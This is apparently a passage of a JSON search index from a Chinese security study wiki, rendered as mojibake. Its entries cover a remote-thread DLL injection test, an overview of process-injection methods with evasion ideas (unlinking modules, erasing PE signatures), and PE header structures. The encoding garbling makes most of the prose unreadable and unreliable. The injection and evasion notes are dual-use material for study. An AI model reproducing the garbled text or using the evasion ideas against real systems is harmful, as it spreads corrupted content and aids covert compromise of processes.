‡è¿›ç¨‹å†™dllååªå†™äº†dllåï¼Œæ‰€ä»¥è¿è¡Œæµ‹è¯•æ—¶InjectedDLL.dllæ–‡ä»¶æ”¾çš„ä½ç½®è¦ç¬¦åˆTargetProcessç¨‹åºæŸ¥æ‰¾dllçš„é¡ºåºï¼ˆå…ˆæ‰¾åŒä¸€ç›®å½•ï¼Œç„¶åæ˜¯ç³»ç»Ÿç›®å½•ï¼‰ã€‚æˆ‘ä»¬å°†dllæ–‡ä»¶å’ŒTargetProcessæ–‡ä»¶æ”¾åœ¨åŒä¸€ç›®å½•ä¸‹å³å¯ å…ˆè¿è¡ŒTargetProcessç¨‹åº 12Target Process ID: 38160 ç„¶åè¿è¡ŒRemoteThreadCreatorè¾“å…¥ç›®æ ‡è¿›ç¨‹ID 123Enter the target process ID: 38160Target process opened successfully.Remote thread created successfully. è§‚å¯Ÿåˆ°ç›®æ ‡è¿›ç¨‹è¾“å‡ºã€‚ç”¨ODçœ‹æ¨¡å—å¯ä»¥çœ‹åˆ°InjectedDLL.dllè¢«åŠ è½½ 123Target Process ID: 38160Thread function in DLL called..."},{"title":"å¼•è¨€_æ³¨å…¥æŠ€æœ¯ä¸“é¢˜","path":"/wiki/Injection/å¼•è¨€_æ³¨å…¥æŠ€æœ¯ä¸“é¢˜.html","content":"ä»€ä¹ˆæ˜¯æ³¨å…¥ æ‰€è°“æ³¨å…¥å°±æ˜¯åœ¨ç¬¬ä¸‰æ–¹è¿›ç¨‹ä¸çŸ¥é“æˆ–è€…ä¸å…è®¸çš„æƒ…å†µä¸‹å°†æ¨¡å—æˆ–è€…ä»£ç å†™å…¥å¯¹æ–¹è¿›ç¨‹ç©ºé—´ï¼Œå¹¶è®¾æ³•æ‰§è¡Œçš„æŠ€æœ¯ã€‚ å…³äºæ³¨å…¥çš„å‘æ•£æ€§æ€è€ƒ æ³¨å…¥çš„æœ¬è´¨ï¼šè®©ç›®æ ‡è¿›ç¨‹æ‰§è¡Œæˆ‘è‡ªå·±çš„ä»£ç æ•°æ® å‰ç½®çŸ¥è¯†ï¼š çº¿ç¨‹æ˜¯ä»£ç çš„æ‰§è¡Œä½“ æ¯ä¸ªè¿›ç¨‹éƒ½æœ‰ç‹¬ç«‹çš„4GBè™šæ‹Ÿå†…å­˜ç©ºé—´ï¼Œé«˜2Gå…±äº«ï¼Œä½2Gè‡ªå·±ç‹¬æœ‰ æ¶‰åŠåˆ°çš„é—®é¢˜ï¼š å¦‚ä½•åœ¨å¦ä¸€ä¸ªè¿›ç¨‹ä¸­æ‰§è¡Œè‡ªå·±çš„ä»£ç ï¼Ÿ è‡ªå·±è¦æ‰§è¡Œçš„ä»£ç ä»å“ªæ¥ï¼Ÿ è´´æ¨¡å—è¿˜æ˜¯è´´ä»£ç  å°†è‡ªå·±çš„ä»£ç è´´åˆ°ç›®æ ‡è¿›ç¨‹ï¼Œæœ‰ä¸¤ç§é€‰æ‹©ï¼Œè´´æ¨¡å—æˆ–è´´ä»£ç  è´´æ¨¡å— ä¼˜ç‚¹ï¼š ç¼ºç‚¹ï¼šç‰¹å¾æ˜æ˜¾ã€‚ æ”»å‡»è€…ï¼šæ³¨å…¥æ¨¡å— é˜²å®ˆè€…ï¼š å¯ä»¥èµ·ä¸€ä¸ªçº¿ç¨‹ï¼Œéš”ä¸€æ®µæ—¶é—´éå†è‡ªå·±çš„æ¨¡å—ã€‚å‘ç°æ–°å¢äº†æ¨¡å—ï¼Œè‚¯å®šæœ‰é—®é¢˜äº† æŸ¥PEæŒ‡çº¹ æ”»å‡»è€…ï¼š æ–­é“¾ï¼Œä¸è®©éå†æ¨¡å—è¢«å‘ç° æŠ¹å»PEæŒ‡çº¹ è´´ä»£ç  ç¼ºç‚¹ï¼šæŠŠè‡ªå·±çš„ä»£ç è½¬æˆshellcodeå¾ˆéº»çƒ¦ï¼Œå°¤å…¶ä»£ç é‡ä¸€å¤šçš„æƒ…å†µã€‚ä¸è¿‡ç½‘ä¸Šæœ‰Cè¯­è¨€shellcodeåŒ–çš„é¡¹ç›®å¯ä»¥å¸®åŠ©æˆ‘ä»¬å°†ä»£ç shellcodeåŒ–ã€‚ ä»£ç æ‰£å‡ºæ¥æ˜¯ç¡¬ç¼–ç ï¼Œè¦è§£å†³å¯¹å…¨å±€å˜é‡å¼•ç”¨é—®é¢˜ï¼Œç³»ç»ŸAPIå‡½æ•°åœ°å€é—®é¢˜ï¼ŒIATè¡¨è¡¨é¡¹ä¹Ÿé”™äº†ã€‚è¦æŠŠä»£ç å¤„ç†æˆshellcodeï¼ˆè´´åˆ°ç›®æ ‡è¿›ç¨‹ä»»æ„ä½ç½®éƒ½èƒ½è¿è¡Œï¼‰ ä¼˜ç‚¹ï¼šå¾ˆéš¾æŸ¥å‡ºæ¥ æ³¨å…¥æ–¹æ¡ˆ ä½¿ç›®æ ‡è¿›ç¨‹è°ƒç”¨LordLibraryåŠ è½½è‡ªå·±çš„æ¶æ„dll-&gt;DLLæ³¨å…¥ï¼Œç¼ºç‚¹ç‰¹å¾æ˜æ˜¾ï¼Œä¸”éå†æ¨¡å—æ—¶ä¼šçœ‹åˆ°ã€‚ ä¸è°ƒç”¨LordLibraryï¼Œè‡ªå·±å®ç°LordLibraryçš„åŠŸèƒ½ï¼Œè¿˜æœ‰ä¸€äº›ç»†èŠ‚å¤„ç†-&gt;æ— æ¨¡å—æ³¨å…¥ æ³¨å…¥è‡ªå·±çš„ä»£ç /æ¨¡å—åï¼Œè®©ç›®æ ‡æ–°èµ·çº¿ç¨‹æ‰§è¡Œè‡ªå·±çš„ä»£ç ï¼ŒåŠæ³•æœ‰è¿œç¨‹çº¿ç¨‹æ³¨å…¥ï¼›æ”¹å˜ç›®æ ‡è¿›ç¨‹ä¸­ç°çº¿ç¨‹æ‰§è¡Œè‡ªå·±çš„ä»£ç -&gt;inline hook å› ä¸ºè¿›ç¨‹çš„è™šæ‹Ÿå†…å­˜ä¹‹é—´äº’ç›¸éš”ç¦»çš„åŸå› ï¼Œè½¬å˜æ€è·¯ï¼Œé‚£å°±è®©ç›®æ ‡ç¨‹åºåœ¨æˆ‘è‡ªå·±çš„è¿›ç¨‹ç©ºé—´ä¸­è¿è¡Œï¼Œè¿™æ ·è¿›ç¨‹ç©ºé—´æ˜¯æˆ‘è‡ªå·±çš„ï¼Œæˆ‘å°±èƒ½æ§åˆ¶ä½å¯¹æ–¹-&gt;æ‰‹åŠ¨æ¨¡æ‹ŸPEåŠ è½½å™¨ è‰ç¨¿ æ³¨å…¥çš„ç§ç±»ï¼š 1ã€æ³¨å†Œè¡¨æ³¨å…¥ 5ã€æ— DLLæ³¨å…¥ 2ã€å¯¼å…¥è¡¨æ³¨å…¥ 6ã€Apc æ³¨å…¥ 3ã€ç‰¹æ´›ä¼Šæ³¨å…¥ 7ã€WindowsæŒ‚é’©æ³¨å…¥DLL 4ã€è¿œç¨‹çº¿ç¨‹æ³¨å…¥ 8ã€è¾“å…¥æ³•æ³¨å…¥ è¿œç¨‹çº¿ç¨‹æ³¨å…¥ã€APCæ³¨å…¥ã€æ¶ˆæ¯é’©å­æ³¨å…¥ã€æ³¨å†Œè¡¨æ³¨å…¥ã€å¯¼å…¥è¡¨æ³¨å…¥ã€è¾“å…¥æ³•æ³¨å…¥ç­‰ç­‰ã€‚"},{"title":"DOSéƒ¨åˆ†","path":"/wiki/PE/DOSéƒ¨åˆ†.html","content":"DOSéƒ¨åˆ†ç”±DOS MZæ–‡ä»¶å¤´å’ŒDOSå—ç»„æˆã€‚DOS MZæ–‡ä»¶å¤´æ˜¯ä¸ªç»“æ„ä½“IMAGE_DOS_HEADERã€‚DOSå—ä¸æ˜¯ç»“æ„ä½“ï¼Œæ˜¯ä¸€å †ç”±å•ä¸ªå­—èŠ‚ç»„æˆçš„æ•°æ®ï¼Œå¯ä»¥å¡«å†™ä»»ä½•å†…å®¹ã€‚ DOS MZæ–‡ä»¶å¤´ DOS MZæ–‡ä»¶å¤´æ˜¯ä¸€ä¸ªç»“æ„ä½“IMAGE_DOS_HEADERï¼Œå¤§å°64ä¸ªå­—èŠ‚ã€‚ winnt.hå¸¦åç§»ç‰ˆ123456789101112131415161718192021typedef struct _IMAGE_DOS_HEADER &#123; // DOS .EXE header WORD e_magic; // Magic number WORD e_cblp; // Bytes on last page of file WORD e_cp; // Pages in file WORD e_crlc; // Relocations WORD e_cparhdr; // Size of header in paragraphs WORD e_minalloc; // Minimum extra paragraphs needed WORD e_maxalloc; // Maximum extra paragraphs needed WORD e_ss; // Initial (relative) SS value WORD e_sp; // Initial SP value WORD e_csum; // Checksum WORD e_ip; // Initial IP value WORD e_cs; // Initial (relative) CS value WORD e_lfarlc; // File address of relocation table WORD e_ovno; // Overlay number WORD e_res[4]; // Reserved words WORD e_oemid; // OEM identifier (for e_oeminfo) WORD e_oeminfo; // OEM information; e_oemid specific WORD e_res2[10]; // Reserved words LONG e_lfanew; // File address of new exe header&#125; IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER;å·¦è¾¹çš„æ•°å­—æ˜¯åˆ°æ–‡ä»¶å¤´çš„åç§»é‡123456789101112131415161718192021IMAGE_DOS_HEADER_STRUCT &#123; +0h e_magic WORD ? ;DOSå¯æ‰§è¡Œæ–‡ä»¶æ ‡è®°â€œMZâ€ +2h e_cblp WORD ? +4h e_cp WORD ? +6h e_crlc WORD ? +8h e_cparhdr WORD ? +0ah e_minalloc WORD ? +0ch e_maxalloc WORD ? +0eh e_ss WORD ? +10h e_sp WORD ? +12h e_csum WORD ? +14h e_ip WORD ? ;DOSä»£ç å…¥å£ IP +16h e_cs WORD ? ;DOSä»£ç å…¥å£ CS +18h e_lfarlc WORD ? +1ah e_ovno WORD ? +1ch e_res WORD 4 dup(?) +24h e_oemid WORD ? +26h e_oeminfo WORD ? +28h e_res2[10] WORD 10 dup(?) +3ch e_lfanew DWORD ? ;æŒ‡å‘PEæ–‡ä»¶å¤´â€œPEâ€,0,0&#125;IMAGE_DOS_HEADER_ENDS; è¯¥ç»“æ„ä½“æ˜¯ç»™16ä½å¹³å°çœ‹çš„ï¼Œå¾ˆå¤šæˆå‘˜åœ¨ç°åœ¨çš„ç¯å¢ƒ(32ä½å’Œ64ä½)ç”¨ä¸åˆ°ï¼Œæˆ‘ä»¬åªéœ€è¦å…³æ³¨å…¶ä¸­çš„ä¸¤ä¸ªæˆå‘˜e_magicå’Œe_lfanewã€‚ e_magicï¼Œ2å­—èŠ‚ï¼Œä½œä¸ºPEæŒ‡çº¹çš„æ ‡è¯†ï¼Œè¦ä¸º4D 5Aã€‚ e_lfanewï¼Œ4å­—èŠ‚ï¼Œå…¨ç§°æ˜¯File Address of New Exe Headerï¼Œä½äºæ–‡ä»¶å¼€å§‹åç§»3Chå­—èŠ‚å¤„ï¼ŒæŒ‡å‡ºPEå¤´ï¼ˆIMAGE_NT_HEADERS32ï¼‰çš„èµ·å§‹ä½ç½®ï¼ˆç›¸å¯¹äºæ–‡ä»¶å¤´çš„åç§»é‡ï¼‰ã€‚ PEæŒ‡çº¹ä¸èƒ½ä¿®æ”¹ï¼Œä¿®æ”¹äº†ç¨‹åºå°±ä¸èƒ½è¿è¡Œï¼š å¦‚æœe_magicä¸ä¸º0x5A4Dhï¼Œåˆ™ç³»ç»Ÿä¸ä¼šè®¤å®šè¯¥æ–‡ä»¶æ˜¯PEæ–‡ä»¶ï¼ŒåŒå‡»æ— æ³•è¿è¡Œã€‚ ä»e_lfanewå–å‡ºPEå¤´åç§»ï¼Œæ ¹æ®åç§»æ‰¾è¿‡å»åçš„Signatureå¦‚æœä¸ä¸º0x00004550ï¼ŒASCIIç å­—ç¬¦â€œPE00â€ï¼Œåˆ™ç³»ç»Ÿä¸ä¼šè®¤å®šè¯¥æ–‡ä»¶æ˜¯PEæ–‡ä»¶ï¼ŒåŒå‡»æ— æ³•è¿è¡Œã€‚ DNS MZæ–‡ä»¶å¤´ä¸­é™¤äº†e_magicå’Œe_lfanewä¸¤ä¸ªå­—æ®µä¸å¯ä¹±åŠ¨å¤–ï¼Œå…¶ä»–å­—æ®µå¯ä»¥ä»»æ„ä¿®æ”¹ï¼Œä¸å½±å“è¿è¡Œã€‚ DOS Stub å¤¹åœ¨DOS MZæ–‡ä»¶å¤´å’ŒPEæ–‡ä»¶å¤´ä¹‹é—´çš„å†…å®¹å°±æ˜¯DOSå—ã€‚è¿™é‡Œçš„å†…å®¹å¯ä»¥æ ¹æ®éœ€è¦éšæ„ä¿®æ”¹ï¼Œä¸å½±å“ç¨‹åºè¿è¡Œã€‚ DOS Stubé‡Œæ˜¯16ä½çš„æ±‡ç¼–ä»£ç ï¼Œæœ‰å…´è¶£å¯ä»¥çœ‹ä¸‹ ç¾½å¤å£³ä¸–ç•Œâ€”â€” PE ç»“æ„ï¼ˆä¸Šï¼‰ A dive into the PE file format - PE file structure - Part 2: DOS Header, DOS Stub and Rich Header"},{"title":"PEå¤´","path":"/wiki/PE/PEå¤´.html","content":"PEå¤´æ˜¯ä¸€ä¸ªç»“æ„ä½“IMAGE_NT_HEADERSï¼Œè¯¥ç»“æ„ä½“æœ‰ä¸‰ä¸ªæˆå‘˜ï¼šPEæ ‡è¯†ï¼Œæ ‡å‡†PEå¤´ï¼Œæ‰©å±•PEå¤´ã€‚ ç»“æ„ä½“ æˆå‘˜ å¤§å° IMAGE_NT_HEADERS Signature 4å­—èŠ‚ IMAGE_FILE_HEADER 20å­—èŠ‚ IMAGE_OPTIONAL_HEADER 32ä½æ˜¯224å­—èŠ‚ï¼Œ0xE0hå­—èŠ‚ã€‚64ä½æ˜¯240å­—èŠ‚ï¼Œ0xF0hå­—èŠ‚ã€‚å¤§å°å¯ä¿®æ”¹ winnt.hå¸¦åç§»ç‰ˆ12345typedef struct _IMAGE_NT_HEADERS &#123; DWORD Signature; // PEæ ‡è¯† IMAGE_FILE_HEADER FileHeader; // æ ‡å‡†PEå¤´ IMAGE_OPTIONAL_HEADER32 OptionalHeader; // æ‰©å±•PEå¤´&#125; IMAGE_NT_HEADERS32, *PIMAGE_NT_HEADERS32;ä»¥ä¸‹çš„åç§»é‡æ˜¯åŸºäºPEæ–‡ä»¶å¤´ï¼ˆIMAGE_NT_HEADERSï¼‰ 12345IMAGE_NT_HEADERS_STRUCT&#123; +0h Signature DWORD ? ;PEæ–‡ä»¶æ ‡è¯† +4h FileHeader IMAGE_FILE_HEADER &lt;&gt; ;æ ‡å‡†PEå¤´ +18h OptionalHeader IMAGE_OPTIONAL_HEADER32 &lt;&gt; ;æ‰©å±•PEå¤´&#125;IMAGE_DOS_HEADER_ENDS; PEæ ‡è¯† ç»“æ„ä½“ä¸­ç¬¬ä¸€ä¸ªæˆå‘˜æ˜¯PEæ ‡è¯†ï¼ŒPEæ ‡è¯†ä¸èƒ½ç ´åï¼Œæ“ä½œç³»ç»Ÿåœ¨å¯åŠ¨ä¸€ä¸ªç¨‹åºçš„æ—¶å€™ä¼šæ£€æµ‹è¿™ä¸ªæ ‡è¯†ã€‚ åœ¨ä¸€ä¸ªæœ‰æ•ˆçš„PEæ–‡ä»¶é‡Œï¼ŒSignatureå­—æ®µè¢«è®¾ç½®ä¸º0x00004550ï¼ŒASCII ç å­—ç¬¦æ˜¯â€œPE00â€ï¼Œ#define IMAGE_NT_SIGNATUREå®šä¹‰äº†è¿™ä¸ªå€¼ï¼š 1#define IMAGE_NT_SIGNATURE 0x00004550 â€œPE00â€æ˜¯PEæ–‡ä»¶å¤´çš„å¼€å§‹ï¼ŒMS-DOSå¤´éƒ¨çš„e_lfanewå­—æ®µæ­£æ˜¯æŒ‡å‘â€œPE\\0\\0â€ã€‚ æ ‡å‡†PEå¤´ ç»“æ„ä½“ä¸­ç¬¬äºŒä¸ªæˆå‘˜æ˜¯ä¸ªç»“æ„ä½“IMAGE_FILE_HEADERï¼Œå¤§å°ä¸º20ä¸ªå­—èŠ‚ï¼Œè¯¥ç»“æ„ä½“åˆç§°ä¸ºæ ‡å‡†PEå¤´ã€‚ winnt.hå¸¦åç§»ç‰ˆ123456789typedef struct _IMAGE_FILE_HEADER &#123; WORD Machine; //è¯¥PEæ–‡ä»¶æ”¯æŒè¿è¡Œçš„å¹³å° WORD NumberOfSections; //Sectionçš„æ•°é‡ DWORD TimeDateStamp; //ç¼–è¯‘å™¨å¡«å†™çš„æ—¶é—´æˆ³ DWORD PointerToSymbolTable; //è°ƒè¯•ç›¸å…³ DWORD NumberOfSymbols; //è°ƒè¯•ç›¸å…³ WORD SizeOfOptionalHeader; //æ ‡è¯†äº†IMAGE_OPTIONAL_HEADER32ç»“æ„çš„å¤§å° WORD Characteristics; //æ–‡ä»¶å±æ€§&#125; IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER;ä»¥ä¸‹çš„åç§»é‡æ˜¯åŸºäºPEæ–‡ä»¶å¤´ï¼ˆIMAGE_NT_HEADERSï¼‰ã€‚ 12345678910typedef struct _IMAGE_FILE_HEADER &#123; +04h WORD Machine; //è¯¥PEæ–‡ä»¶æ”¯æŒè¿è¡Œçš„å¹³å° +06h WORD NumberOfSections; //Sectionçš„æ•°é‡ +08h DWORD TimeDateStamp; //ç¼–è¯‘å™¨å¡«å†™çš„æ—¶é—´æˆ³ +0Ch DWORD PointerToSymbolTable; //è°ƒè¯•ç›¸å…³ +10h DWORD NumberOfSymbols; //è°ƒè¯•ç›¸å…³ +14h WORD SizeOfOptionalHeader; //æ ‡è¯†äº†IMAGE_OPTIONAL_HEADER32ç»“æ„çš„å¤§å° +16h WORD Characteristics; //æ–‡ä»¶å±æ€§&#125; IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER; Machineï¼šè¡¨ç¤ºå½“å‰å¯æ‰§è¡Œæ–‡ä»¶å¯ä»¥åœ¨å“ªäº›CPUä¸Šè¿è¡Œã€‚å¦‚ä¸‹æ˜¯å‡ ç§å…¸å‹çš„æœºå™¨ç±»å‹æ ‡å¿—ã€‚ æœºå™¨ æ ‡å¿— ä»»æ„CPU 0x0000h Intel i386åŠåç»­çš„å‹å·CPU 0x14Ch 64ä½çš„CPUå‹å· 0x8664 MIPS R3000 162h MIPS R4000 166h Alpha AXP 184h Power PC 1F0h 1234567891011121314151617181920212223242526272829303132#define IMAGE_FILE_MACHINE_UNKNOWN 0#define IMAGE_FILE_MACHINE_TARGET_HOST 0x0001 // Useful for indicating we want to interact with the host and not a WoW guest.#define IMAGE_FILE_MACHINE_I386 0x014c // Intel 386.#define IMAGE_FILE_MACHINE_R3000 0x0162 // MIPS little-endian, 0x160 big-endian#define IMAGE_FILE_MACHINE_R4000 0x0166 // MIPS little-endian#define IMAGE_FILE_MACHINE_R10000 0x0168 // MIPS little-endian#define IMAGE_FILE_MACHINE_WCEMIPSV2 0x0169 // MIPS little-endian WCE v2#define IMAGE_FILE_MACHINE_ALPHA 0x0184 // Alpha_AXP#define IMAGE_FILE_MACHINE_SH3 0x01a2 // SH3 little-endian#define IMAGE_FILE_MACHINE_SH3DSP 0x01a3#define IMAGE_FILE_MACHINE_SH3E 0x01a4 // SH3E little-endian#define IMAGE_FILE_MACHINE_SH4 0x01a6 // SH4 little-endian#define IMAGE_FILE_MACHINE_SH5 0x01a8 // SH5#define IMAGE_FILE_MACHINE_ARM 0x01c0 // ARM Little-Endian#define IMAGE_FILE_MACHINE_THUMB 0x01c2 // ARM Thumb/Thumb-2 Little-Endian#define IMAGE_FILE_MACHINE_ARMNT 0x01c4 // ARM Thumb-2 Little-Endian#define IMAGE_FILE_MACHINE_AM33 0x01d3#define IMAGE_FILE_MACHINE_POWERPC 0x01F0 // IBM PowerPC Little-Endian#define IMAGE_FILE_MACHINE_POWERPCFP 0x01f1#define IMAGE_FILE_MACHINE_IA64 0x0200 // Intel 64#define IMAGE_FILE_MACHINE_MIPS16 0x0266 // MIPS#define IMAGE_FILE_MACHINE_ALPHA64 0x0284 // ALPHA64#define IMAGE_FILE_MACHINE_MIPSFPU 0x0366 // MIPS#define IMAGE_FILE_MACHINE_MIPSFPU16 0x0466 // MIPS#define IMAGE_FILE_MACHINE_AXP64 IMAGE_FILE_MACHINE_ALPHA64#define IMAGE_FILE_MACHINE_TRICORE 0x0520 // Infineon#define IMAGE_FILE_MACHINE_CEF 0x0CEF#define IMAGE_FILE_MACHINE_EBC 0x0EBC // EFI Byte Code#define IMAGE_FILE_MACHINE_AMD64 0x8664 // AMD64 (K8)#define IMAGE_FILE_MACHINE_M32R 0x9041 // M32R little-endian#define IMAGE_FILE_MACHINE_ARM64 0xAA64 // ARM64 Little-Endian#define IMAGE_FILE_MACHINE_CEE 0xC0EE NumberOfSectionsï¼šå½“å‰PEæ–‡ä»¶å«æœ‰Sectionçš„æ•°é‡ï¼Œä¹Ÿå°±æ˜¯PEå¤´ï¼ˆIMAGE_NT_HEADERSï¼‰åæœ‰å‡ ä¸ªèŠ‚è¡¨ã€‚ TimeDateStampï¼šç¼–è¯‘å™¨ç¼–è¯‘æ—¶å¡«å†™çš„æ—¶é—´æˆ³ã€‚è¿™ä¸ªå€¼æ˜¯è‡ª1970å¹´1æœˆ1æ—¥ä»¥æ¥ç”¨æ ¼æ—å¨æ²»æ—¶é—´(GMT)è®¡ç®—çš„ç§’æ•°ï¼Œå³è®¡ç®—çš„æ˜¯å½“å‰æ—¶é—´ä¸1970å¹´01æœˆ01æ—¥00æ—¶00åˆ†00ç§’å·®çš„ç§’æ•°ï¼Œæ¯”å¦‚2010å¹´10æœˆ10å·10ç‚¹10åˆ†10ç§’ç¼–è¯‘çš„ï¼Œè¿™ä¸ªæ—¶é—´ç›¸æ¯”äº1970å¹´01æœˆ01æ—¥00æ—¶00åˆ†00ç§’è¿‡å»äº†å¤šå°‘ç§’ï¼Œè½¬æˆåå…­è¿›åˆ¶ã€‚å°†è¿™ä¸ªå€¼ç¿»è¯‘ä¸ºæ˜“è¯»çš„å­—ç¬¦ä¸²éœ€è¦ä½¿ç”¨_ctimeå‡½æ•°(å®ƒæ˜¯æ—¶åŒºæ•æ„Ÿå‹çš„)ã€‚å¦ä¸€ä¸ªå¯¹æ­¤å­—æ®µè®¡ç®—æœ‰ç”¨çš„å‡½æ•°æ˜¯gmtimeã€‚ ä¸åœ¨æ“ä½œç³»ç»Ÿä¸Šå¯¹ä¸€ä¸ªæ–‡ä»¶å³é”®çœ‹åˆ°çš„åˆ›å»ºã€ä¿®æ”¹ã€è®¿é—®æ—¶é—´æ²¡å…³ç³»ã€‚å³é”®çœ‹åˆ°çš„åˆ›å»ºã€ä¿®æ”¹ã€è®¿é—®æ—¶é—´æ˜¯æ“ä½œç³»ç»Ÿè®°å½•çš„æ—¶é—´ã€‚ TimeDateStampå¯ä»¥éšæ„ä¿®æ”¹ã€‚ ä¸€äº›åŠ å£³è½¯ä»¶åŠ å£³æ—¶è¦æ±‚æä¾›.exeå’Œ.mapæ–‡ä»¶ï¼Œé€šè¿‡æ¯”å¯¹exeå’Œ.mapæ–‡ä»¶çš„è¯¥å­—æ®µæ¥åˆ¤æ–­.mapæ˜¯å¦å’Œè¿™ä¸ªexeæ˜¯å¦æ˜¯é…å¯¹çš„ã€‚ä¾‹ï¼š.mapæ˜¯ä¸Šå‘¨ç”Ÿæˆçš„ï¼Œ.exeæ˜¯åˆšç¼–è¯‘çš„ï¼Œå®ƒä¸¤ä¸æ˜¯é…å¯¹çš„ä¸€å †ï¼Œè¿™æ ·çš„è¯åŠ å£³æ—¶ä¼šä¹±å¥—ã€‚.mapæ–‡ä»¶æ˜¯ä»€ä¹ˆ.mapæ–‡ä»¶åœ¨Cè¯­è¨€ç¼–ç¨‹ä¸­æ˜¯ç”±é“¾æ¥å™¨ç”Ÿæˆçš„ä¸€ç§æ–‡ä»¶ï¼Œå®ƒæä¾›äº†ç¼–è¯‘åçš„ç¨‹åºä¸­å‡½æ•°å’Œå˜é‡çš„åœ°å€æ˜ å°„ä¿¡æ¯ã€‚è¿™ä¸ªæ–‡ä»¶åŒ…å«äº†æºä»£ç ä¸­çš„ç¬¦å·ï¼ˆå¦‚å‡½æ•°ã€å˜é‡ç­‰ï¼‰åˆ°å…¶åœ¨å¯æ‰§è¡Œæ–‡ä»¶ä¸­çš„åœ°å€çš„æ˜ å°„å…³ç³»ã€‚è¿™å¯¹äºè°ƒè¯•å’Œç¨‹åºåˆ†æéå¸¸æœ‰ç”¨ã€‚åŠ å£³è½¯ä»¶å¯ä»¥é€šè¿‡.mapæ–‡ä»¶æä¾›çš„ç¬¦å·ä¿¡æ¯æ¥å¯¹exeè¿›è¡ŒåŠ å£³ä¿æŠ¤ã€‚ PointerToSymbolTableï¼šè°ƒè¯•ç›¸å…³ï¼Œæš‚ä¸äº†è§£ NumberOfSymbolsï¼šè°ƒè¯•ç›¸å…³ï¼Œæš‚ä¸äº†è§£ SizeOfOptionalHeaderï¼šæ ‡è¯†äº†IMAGE_OPTIONAL_HEADERç»“æ„çš„å¤§å°ã€‚æœªåšä¿®æ”¹çš„é»˜è®¤æƒ…å†µä¸‹ï¼Œ32ä½å’Œ64ä½PEæ–‡ä»¶æ‰©å±•PEå¤´çš„å¤§å°å¦‚ä¸‹ï¼š æ–‡ä»¶ä½æ•° åå…­è¿›åˆ¶ åè¿›åˆ¶ 32ä½ E0h 224å­—èŠ‚ 64ä½ F0h 240å­—èŠ‚ Characteristicsï¼šæ–‡ä»¶å±æ€§ã€‚è¯¥å­—æ®µé•¿åº¦16ä½ï¼Œæ¯ä¸€ä½éƒ½æœ‰ä¸¤ç§å«ä¹‰ï¼Œç”±0-15çš„æ¯ä¸€ä½æä¾›æ–‡ä»¶å±æ€§ã€‚è¿™ä¸ªå­—æ®µæ˜¯ä¸€ä¸ªä½æ©ç ï¼Œå¯ä»¥é€šè¿‡å¯¹è¿™ä¸ªå€¼è¿›è¡Œä½è¿ç®—æ¥ç¡®å®šè®¾ç½®äº†å“ªäº›æ ‡å¿—ã€‚ æ•°æ®ä½ å¸¸é‡ç¬¦å· å«ä¹‰ 0001h IMAGE_FILE_RELOCS_STRIPPED æ–‡ä»¶ä¸­ä¸å­˜åœ¨é‡å®šä½ä¿¡æ¯ 0002h IMAGE_FILE_EXECUTABLE_IMAGE æ–‡ä»¶æ˜¯å¯æ‰§è¡Œçš„ã€‚å¦‚æœä¸º0ï¼Œä¸€èˆ¬æ˜¯é“¾æ¥æ—¶å‡ºé—®é¢˜äº† 0004h IMAGE_FILE_LINE_NUMS_STRIPPED ä¸å­˜åœ¨è¡Œå·ä¿¡æ¯ï¼Œè¡Œå·ä¿¡æ¯è¢«ç§»å» 0008h IMAGE_FILE_LOCAL_SYMS_STRIPPED ä¸å­˜åœ¨ç¬¦å·ä¿¡æ¯ï¼Œç¬¦å·ä¿¡æ¯è¢«ç§»å» 0010h IMAGE_FILE_AGGRESSIVE_WS_TRIM è°ƒæ•´å·¥ä½œé›† 0020h IMAGE_FILE_LARGE_ADDRESS_AWARE åº”ç”¨ç¨‹åºå¯ä»¥å¤„ç†è¶…è¿‡2GBçš„åœ°å€ã€‚è¯¥åŠŸèƒ½æ˜¯ä»NT SP3å¼€å§‹è¢«æ”¯æŒçš„ã€‚å› ä¸ºå¤§éƒ¨åˆ†æ•°æ®åº“æœåŠ¡å™¨éœ€è¦å¾ˆå¤§çš„å†…å­˜ï¼Œè€ŒNTä»…æä¾›2CBç»™åº”ç”¨ç¨‹åºï¼Œæ‰€ä»¥ä»NT SP3å¼€å§‹ï¼Œé€šè¿‡åŠ è½½/3GBå‚æ•°ï¼Œå¯ä»¥ä½¿åº”ç”¨ç¨‹åºè¢«åˆ†é…2ï½3GBåŒºåŸŸçš„åœ°å€,è€Œè¯¥å¤„åŸæ¥å±äºç³»ç»Ÿå†…å­˜åŒº 0040h æ­¤æ ‡å¿—ä¿ç•™ 0080h IMAGE_FILE_BYTES_REVERSED_LO å°å°¾æ–¹å¼ï¼Œå¤„ç†æœºçš„ä½ä½å­—èŠ‚æ˜¯ç›¸åçš„ 0100h IMAGE_FILE_32BIT_MACHINE åªåœ¨32ä½å¹³å°ä¸Šè¿è¡Œ 0200h IMAGE_FILE_DEBUG_STRIPPED ä¸åŒ…å«è°ƒè¯•ä¿¡æ¯ï¼Œ.DBGæ–‡ä»¶çš„è°ƒè¯•ä¿¡æ¯è¢«ç§»å» 0400h IMAGE_FILE_REMOVABLE_RUN_FROM_SWAP ä¸èƒ½ä»å¯ç§»åŠ¨ç›˜è¿è¡Œã€‚å¦‚æœæ˜ åƒæ–‡ä»¶åœ¨å¯ç§»åŠ¨ä»‹è´¨ä¸­,åˆ™å…ˆå¤åˆ¶åˆ°äº¤æ¢æ–‡ä»¶ä¸­å†è¿è¡Œã€‚ 0800h IMAGE_FILE_NET_RUN_FROM_SWAP ä¸èƒ½ä»ç½‘ç»œè¿è¡Œå¦‚æœæ˜ åƒæ–‡ä»¶åœ¨ç½‘ç»œä¸­,åˆ™å¤åˆ¶åˆ°äº¤æ¢æ–‡ä»¶åæ‰èƒ½è¿è¡Œã€‚ 1000h IMAGE_FILE_SYSTEM ç³»ç»Ÿæ–‡ä»¶ï¼ˆå¦‚é©±åŠ¨ç¨‹åºï¼‰ï¼Œä¸èƒ½ç›´æ¥è¿è¡Œ 2000h IMAGE_FILE_DLL è¿™æ˜¯ä¸€ä¸ªDLLæ–‡ä»¶ 4000h IMAGE_FILE_UP_SYSTEM_ONLY æ–‡ä»¶åªèƒ½è¿è¡Œåœ¨å•å¤„ç†å™¨ä¸Šï¼Œä¸èƒ½åœ¨å¤šå¤„ç†å™¨è®¡ç®—æœºä¸Šè¿è¡Œ 8000h IMAGE_FILE_BYTES_REVERSED_HI å¤§å°¾æ–¹å¼ï¼Œå¤„ç†æœºçš„é«˜ä½å­—èŠ‚æ˜¯ç›¸åçš„ è¡¨æ 